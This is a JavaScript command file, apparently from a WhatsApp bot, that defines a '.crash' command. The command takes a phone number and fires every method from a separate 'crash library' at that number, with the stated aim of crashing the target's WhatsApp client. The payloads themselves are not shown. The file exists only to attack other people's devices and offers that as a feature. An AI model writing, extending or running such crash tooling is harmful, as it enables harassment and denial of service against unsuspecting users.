// commands/crash/crash.js
'use strict';

module.exports = {
    name: 'crash',
    aliases: ['crashall', 'executeall', 'alldamage'],
    category: 'crash',
    desc: 'ᴇxᴇᴄᴜᴛᴇ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
    usage: '.crash <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
        const crashLib = global.getCrashLib();
        
        if (!crashLib) return sock.sendMessage(ctx.from, { text: '❌ ᴄʀᴀsʜʟɪʙ ɴᴏᴛ ʀᴇᴀᴅʏ' }, { quoted: msg });
        
        await sock.sendMessage(ctx.from, { text: '💣 ᴇxᴇᴄᴜᴛɪɴɢ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs...' }, { quoted: msg });
        
        try {
            await crashLib.executeAll(target, msg);
            return sock.sendMessage(ctx.from, { text: '✅ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};